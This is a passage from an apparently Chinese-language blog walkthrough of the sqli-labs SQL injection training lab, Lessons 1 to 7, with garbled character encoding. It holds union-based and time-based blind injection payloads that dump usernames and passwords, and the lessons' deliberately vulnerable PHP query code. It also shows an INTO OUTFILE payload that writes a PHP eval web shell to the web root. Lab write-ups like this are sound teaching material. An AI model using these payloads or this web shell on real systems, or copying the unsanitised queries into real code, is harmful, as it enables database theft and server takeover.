class="number">23</span></span><br></pre></td></tr></table></figure><img src="/2019/10/17/sqli-labs-wp/TIMæˆªå›¾20200304214457.png" style="zoom:80%;"><h3 id="å…³é”®ä»£ç "><a href="#å…³é”®ä»£ç " class="headerlink" title="å…³é”®ä»£ç "></a>å…³é”®ä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. $row[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .$row[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p><strong>é¢˜ç›®åŒæ ·å¯ä»¥ç”¨æŠ¥é”™æ³¨å…¥çš„æ–¹å¼</strong></p><p>å»¶ç»­ç¬¬ä¸€é¢˜çš„æ€è·¯ï¼Œæƒ³è®©æŠ¥é”™</p><pre><code>?id=1&#39;</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191019185105.png"></p><p>åˆ†æä¸€ä¸‹</p><pre><code>&#39;&#39; LIMIT 0,1&#39;</code></pre><p>å¥½åƒ$idæ²¡æœ‰<code>&#39;</code>ä¹‹ç±»çš„</p><p>åå°sqlè¯­å¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>æœç„¶æ²¡æœ‰</p><p><strong>order byåˆ¤æ–­åˆ—æ•°</strong></p><pre><code>?id=1 order by 3%23</code></pre><p>å‘ç°è¿˜æ˜¯3åˆ—</p><p><strong>çˆ†æ•°æ®åº“</strong></p><pre><code>?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata%23</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191019175513.png"></p><p><strong>çˆ†è¡¨</strong></p><pre><code>?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191019175923.png"></p><p><strong>çˆ†å­—æ®µ</strong></p><pre><code>?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;%23</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191019175923.png"></p><p><strong>çˆ†å†…å®¹</strong></p><pre><code>?id=-1 union select 1,group_concat(id,0x23,username,0x23,password),3 from security.users%23</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191019192103.png"></p><h3 id="å…³é”®ä»£ç -1"><a href="#å…³é”®ä»£ç -1" class="headerlink" title="å…³é”®ä»£ç "></a>å…³é”®ä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. $row[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .$row[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p><strong>é¢˜ç›®åŒæ ·å¯ä»¥ç”¨æŠ¥é”™æ³¨å…¥çš„æ–¹å¼</strong></p><p>ç»§ç»­è®©å…¶æŠ¥é”™<br>        ?id=1â€™</p><p><img src="/2019/10/17/sqli-labs-wp/20191019185647.png"></p><p>åˆ†æä»¥ä¸‹</p><pre><code>&#39;&#39;1&#39;&#39;) LIMIT 0,1&#39;</code></pre><p>ç”±æŠ¥é”™ä¿¡æ¯å¯çŸ¥ï¼Œåå°çš„sqlè¯­å¥åº”è¯¥å¸¦æœ‰æ‹¬å·ï¼Œå¹¶ä¸”æœ‰<code>&#39;</code>,å³<code>(&#39;$id&#39;)</code></p><p>çœ‹ä¸‹åå°è¯­å¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;(&#39;$id&#39;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>æœç„¶å¦‚æ­¤</p><p>é‚£ä¹ˆæ¥ä¸‹æ¥è¿˜æ˜¯è€è§„çŸ©äº†</p><p><strong>order byåˆ¤æ–­åˆ—æ•°</strong></p><pre><code>?id=1&#39;) order by 3%23</code></pre><p><strong>çˆ†æ•°æ®åº“</strong></p><pre><code>?id=-1&#39;) union select 1,group_concat(schema_name),3 from information_schema.schemata%23</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191019190941.png"></p><p><strong>çˆ†è¡¨</strong></p><pre><code>?id=-1&#39;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191019191138.png"></p><p><strong>çˆ†å­—æ®µ</strong></p><pre><code>?id=-1&#39;) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;%23</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191019191633.png"></p><p><strong>çˆ†å†…å®¹</strong></p><pre><code>?id=-1&#39;) union select 1,group_concat(id,0x23,username,0x23,password),3 from security.users%23</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191019191856.png"></p><h3 id="å…³é”®ä»£ç -2"><a href="#å…³é”®ä»£ç -2" class="headerlink" title="å…³é”®ä»£ç "></a>å…³é”®ä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="string">&#x27;&quot;&#x27;</span> . $id . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. $row[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .$row[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>åŒæ ·ï¼Œç»§ç»­è¿™ç§æ€è·¯</p><p>å‘ç°å½“åŠ ä¸Š<code>&quot;</code>æŠ¥é”™<br>    ?id=1â€</p><p><img src="/2019/10/17/sqli-labs-wp/20191019203800.png"></p><p>åˆ†æä¸€ä¸‹æŠ¥é”™</p><pre><code>&#39;&quot;1&quot;&quot;) LIMIT 0,1&#39;</code></pre><p>åå°çš„sqlè¯­å¥åº”è¯¥ä¸º<code>(&quot;$id&quot;)</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id &#x3D; &#39;&quot;&#39; . $id . &#39;&quot;&#39;;</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;($id) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>å’Œæˆ‘ä»¬çŒœçš„ä¸€æ ·</p><p><strong>order byåˆ¤æ–­åˆ—æ•°</strong></p><pre><code>?id=1&quot;) order by 3%23</code></pre><p>åŒæ ·æ˜¯ä¸‰åˆ—</p><p><strong>çˆ†æ•°æ®åº“</strong></p><pre><code>?id=-1&quot;) union select 1,2,group_concat(schema_name) from information_schema.schemata%23</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191019204652.png"></p><p><strong>çˆ†è¡¨</strong></p><pre><code>?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191019205058.png"></p><p><strong>çˆ†å­—æ®µ</strong></p><pre><code>?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;%23    </code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191019205243.png"></p><p><strong>çˆ†å†…å®¹</strong></p><pre><code>?id=-1&quot;) union select 1,2,group_concat(id,0x23,username,0x23,password) from security.users%23</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191019205536.png"></p><h3 id="å…³é”®ä»£ç -3"><a href="#å…³é”®ä»£ç -3" class="headerlink" title="å…³é”®ä»£ç "></a>å…³é”®ä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="string">&#x27;&quot;&#x27;</span> . $id . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. $row[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .$row[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p><strong>æŠ¥é”™æ³¨å…¥</strong></p><p>é¢˜ç›®è€ƒå¯Ÿçš„æ˜¯æŠ¥é”™æ³¨å…¥ï¼Œç¬¬ä¸€æ¬¡æˆ‘ç”¨äº†ç›²æ³¨ğŸ˜‚</p><p>æ€è·¯å’ŒLess-1ä¸€æ ·</p><p><strong>ç›²æ³¨</strong></p><p>è™½ç„¶ä¸æ˜¯ï¼Œä½†æ˜¯è¿˜æ˜¯è¦æ ¹æ®æŠ¥é”™ä¿¡æ¯æ¥æ„é€ è¯­å¥</p><pre><code>?id=1&#39;</code></pre><p><img src="/2019/10/17/sqli-labs-wp/20191019211855.png"></p><p>åˆ†æä¸€ä¸‹æŠ¥é”™ä¿¡æ¯</p><pre><code>&#39;&#39;1&#39;&#39; LIMIT 0,1&#39;</code></pre><p>å¥½åƒå’ŒLess-1ä¸€æ ·ï¼Œä½†æ˜¯ç°åœ¨ä¸å›æ˜¾æŸ¥è¯¢çš„ç»“æœäº†</p><p>è¿™å°±æ˜¯ç›²æ³¨ï¼Œéœ€è¦å†™è„šæœ¬æ¥çˆ†ç ´å†…å®¹ï¼Œåœ¨è¿™ä¹‹å‰å…ˆä»‹ç»å‡ ä¸ªå‡½æ•°</p><p><strong>ifå‡½æ•°</strong></p><pre><code>æ ¼å¼ï¼šIF(Condition,A,B)å«ä¹‰ï¼šå¦‚æœConditionæˆç«‹ï¼Œåˆ™Aï¼Œå¦åˆ™B</code></pre><p><strong>substrå‡½æ•°</strong></p><pre><code>æ ¼å¼ï¼šSUBSTR(string,start,len)å«ä¹‰ï¼šä»stringçš„startä½å¼€å§‹æˆªå–lenä¸ªå­—ç¬¦</code></pre><p><strong>midå‡½æ•°</strong></p><pre><code>æ ¼å¼ï¼šMID(column_name,start[,length])å«ä¹‰ï¼šä»column_nameä¸­startä½å¼€å§‹æˆªå–length(å¯é€‰å‚æ•°)é•¿åº¦</code></pre><p><strong>asciiå‡½æ•°</strong></p><pre><code>æ ¼å¼ï¼šASCII(char)å«ä¹‰ï¼šå°†charè½¬åŒ–æˆasciiç </code></pre><p><strong>leftå‡½æ•°</strong></p><pre><code>æ ¼å¼ï¼šLEFT ( string, n )å«ä¹‰ï¼šå‡½æ•°å¾—åˆ°å­—ç¬¦ä¸²å·¦éƒ¨æŒ‡å®šä¸ªæ•°çš„å­—ç¬¦ï¼Œstringä¸ºè¦æˆªå–çš„å­—ç¬¦ä¸²ï¼Œnä¸ºé•¿åº¦ã€‚</code></pre><p><strong>rightå‡½æ•°</strong></p><pre><code>æ ¼å¼ï¼šRIGHT( string, n )å«ä¹‰ï¼šå‡½æ•°å¾—åˆ°å­—ç¬¦ä¸²å³éƒ¨æŒ‡å®šä¸ªæ•°çš„å­—ç¬¦ï¼Œstringä¸ºè¦æˆªå–çš„å­—ç¬¦ä¸²ï¼Œnä¸ºé•¿åº¦ã€‚</code></pre><p><strong>lengthå‡½æ•°</strong></p><pre><code>æ ¼å¼ï¼šLENGTH(string)å«ä¹‰ï¼šå¾—åˆ°stringçš„é•¿åº¦</code></pre><p><strong>æ¨¡æ¿</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">r&#x3D;requests.get(url+payload,timeout&#x3D;3)&#x2F;&#x2F;æ³¨æ„è¦è®¾ç½®è®¾ç½®timeout</span><br><span class="line">except requests.exceptions.ReadTimeout as e:&#x2F;&#x2F;è¶…æ—¶å¼‚å¸¸</span><br><span class="line">data+&#x3D;chr(j)</span><br><span class="line">break</span><br></pre></td></tr></table></figure><p>å¤–é¢åµŒå¥—å¾ªç¯å°±è¡Œ</p><p><strong>çˆ†æ•°æ®åº“</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &quot;?id&#x3D;1&#39; and if(ascii(substr(database(),&#123;&#125;,1))&#x3D;&#123;&#125;,sleep(3),1)%23&quot;.format(j, k)</span><br></pre></td></tr></table></figure><p><strong>çˆ†è¡¨</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;&quot;?id&#x3D;1&#39; and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit &#123;&#125;,1),&#123;&#125;,1))&#x3D;&#123;&#125;,sleep(3),1)%23&quot;.format(k , i, j)</span><br></pre></td></tr></table></figure><p><strong>çˆ†å­—æ®µ</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;&quot;?id&#x3D;1&#39; and if(ascii(substr((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&quot;&#123;&#125;&quot; limit &#123;&#125;,1),&#123;&#125;,1))&#x3D;&#123;&#125;,sleep(3),1)%23&quot;.format(te,k,i,j)</span><br></pre></td></tr></table></figure><p><strong>çˆ†å†…å®¹</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;&quot;?id&#x3D;1&#39; and if(ascii(substring((select &#123;&#125; from &#123;&#125;.&#123;&#125; limit &#123;&#125;,1),&#123;&#125;,1))&#x3D;&#123;&#125;,sleep(3),1)%23&quot;.format(co,db,ta,k,i,j)</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§è¿™ä¸ªpayloadå°±å¯ä»¥è·‘å‡ºæ¥ï¼Œä½†é€Ÿåº¦æ˜¯æ˜¯çœŸçš„æ…¢</p><h3 id="å…³é”®ä»£ç -4"><a href="#å…³é”®ä»£ç -4" class="headerlink" title="å…³é”®ä»£ç "></a>å…³é”®ä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p><strong>é¢˜ç›®åŒæ ·å¯ä»¥ç”¨æŠ¥é”™æ³¨å…¥çš„æ–¹å¼</strong></p><p>åŒæ ·å¯ä»¥å…ˆè®©å…¶æŠ¥é”™ï¼ŒæŸ¥çœ‹åå°sqlè¯­æ³•</p><p>å‘ç°å½“</p><pre><code>?id=6&quot;</code></pre><p>æ—¶ï¼Œä¼šæŠ¥é”™å‡ºè¯­å¥</p><p><img src="/2019/10/17/sqli-labs-wp/20191024225813.png"></p><p>å¯ä»¥çœ‹åˆ°åå°çš„sqlè¯­å¥ä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id &#x3D; &#39;&quot;&#39;.$id.&#39;&quot;&#39;;</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>åé¢çš„æ“ä½œå’Œä¹‹å‰å°±æ²¡ä»€ä¹ˆåŒºåˆ«äº†ï¼Œåˆ©ç”¨</p><pre><code>?id=1&quot;+æ³¨å…¥è¯­å¥+%23</code></pre><p>å°±å¯ä»¥æ³¨å…¥å¾—åˆ°ç»“æœäº†</p><h3 id="å…³é”®ä»£ç -5"><a href="#å…³é”®ä»£ç -5" class="headerlink" title="å…³é”®ä»£ç "></a>å…³é”®ä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="string">&#x27;&quot;&#x27;</span>.$id.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot;  color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><h3 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a>ç›²æ³¨</h3><p>è¿™é¢˜å¥½åƒçˆ†ä¸å‡ºåå°sqlè¯­å¥ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å¤šè¯•è¯•å¸¸ç”¨çš„æµ‹è¯•æ³¨å…¥çš„è¯­å¥</p><p>ç›´æ¥çœ‹ä¸‹å‘ç°æºç å§ï¼Œå‘ç°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;((&#39;$id&#39;)) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><p>åŒæ ·ï¼Œåˆ©ç”¨</p><pre><code>?id=1&#39;))+æ³¨å…¥è¯­å¥+%23</code></pre><p>ä¹Ÿå¯ä»¥ç›²æ³¨æ³¨å…¥äº†</p><h3 id="å†™æ–‡ä»¶"><a href="#å†™æ–‡ä»¶" class="headerlink" title="å†™æ–‡ä»¶"></a>å†™æ–‡ä»¶</h3><p>å…ˆçœ‹ä¸‹è·¯å¾„ï¼Œè¿™ä¸ªå¥½åƒæŠ¥ä¸å‡ºæ¥ï¼Œåªèƒ½ç”¨å…¶ä»–çš„é¢˜ç›®ï¼Œä»¥Less-1ä¸ºä¾‹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/Less-1/?id=-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,@@basedir,@@datadir%<span class="number">23</span></span><br></pre></td></tr></table></figure><img src="/2019/10/17/sqli-labs-wp/TIMæˆªå›¾20200304222338.png" style="zoom:67%;"><p><code>@@basedir</code>æ˜¯æŒ‡Mysqlçš„å®‰è£…ç›®å½•ï¼Œ<code>@@datadir</code>æ˜¯æŒ‡æ•°æ®åº“æ–‡ä»¶çš„è·¯å¾„ï¼Œæˆ‘ä»¬éœ€è¦ç”¨webç›®å½•ï¼Œé»˜è®¤<code>/var/www/html</code>,å› æ­¤æˆ‘ä»¬</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">&quot;/var/www/html/moonback.php&quot;</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure><p><img src="/2019/10/17/sqli-labs-wp/TIM%E6%88%AA%E5%9B%BE20200313231423.png"></p><p>æ³¨æ„è¿™ä¸ªå†™çš„ç›®å½•è¦æœ‰æƒé™ï¼Œå¹¶ä¸”mysqlæœ‰å†™æ–‡ä»¶æƒé™ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span 